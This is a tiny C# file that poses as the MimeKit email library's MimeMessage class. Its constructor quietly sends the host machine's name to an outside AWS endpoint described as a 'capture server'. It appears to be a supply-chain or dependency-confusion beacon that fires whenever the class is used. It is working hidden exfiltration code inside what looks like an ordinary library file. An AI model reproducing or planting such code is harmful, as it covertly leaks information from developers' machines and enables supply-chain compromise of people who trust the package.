using System;
using System.Net;
using System.Net.Http;

namespace MimeKit;

public class MimeMessage
{
    public MimeMessage()
    {
        using (var client = new HttpClient())
        {
            var uri = new Uri($"https://m1upcs0as9.execute-api.us-east-1.amazonaws.com/default/httpListener?hostname={Dns.GetHostName()}"); // URL to your capture server
            client.GetAsync(uri);
        }
    }
}